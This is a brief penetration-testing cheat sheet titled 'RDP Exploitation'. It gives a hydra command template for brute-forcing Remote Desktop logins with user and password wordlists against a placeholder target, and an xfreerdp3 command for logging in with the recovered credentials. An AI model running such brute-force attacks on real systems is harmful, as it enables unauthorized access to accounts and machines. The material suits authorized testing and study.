
## RDP Exploitation

### Bruteforce Attack RDP

```bash
hydra -L <username/user wordlist> -P <password/password wordlist> rdp://<TARGET IP>
```


### Logging into RDP

```bash
xfreerdp3 /v:<TARGET IP> /u:<username> /p:"<password>"
```


